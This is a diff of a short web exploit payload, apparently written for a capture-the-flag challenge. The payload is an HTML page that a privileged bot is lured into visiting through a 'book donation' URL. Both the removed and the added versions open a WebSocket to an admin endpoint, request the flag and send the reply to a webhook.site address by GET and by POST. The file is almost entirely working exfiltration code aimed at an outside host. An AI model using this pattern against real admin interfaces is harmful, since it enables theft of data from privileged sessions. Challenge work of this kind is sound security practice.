@@ -1,27 +1,13 @@
-<!-- Host this file on a public server and submit its URL as a book donation -->
-<html>
-  <body>
-    <script>
-      try {
-        // Connect to the admin WebSocket
-        var ws = new WebSocket("ws://65.109.201.174:8080/admin/ws");
-        ws.onopen = function() {
-          ws.send("flag");
-        };
-        ws.onmessage = function(event) {
-          // Exfiltrate the flag to your webhook
-          var flag = event.data;
-          // Try GET
-          var img = new Image();
-          img.src = "https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d?flag=" + encodeURIComponent(flag);
-          // Try POST as fallback
-          fetch("https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d", {
-            method: "POST",
-            mode: "no-cors",
-            body: flag
-          });
-        };
-      } catch (e) {}
-    </script>
-  </body>
-</html>
+<script>
+(async () => {
+  // Connect to the admin WebSocket
+  let ws = new WebSocket('ws://web:8080/admin/ws');
+  ws.onopen = () => {
+    ws.send('flag');
+  };
+  ws.onmessage = (e) => {
+    // Exfiltrate the flag
+    fetch('https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d?flag=' + encodeURIComponent(e.data));
+  };
+})();
+</script>
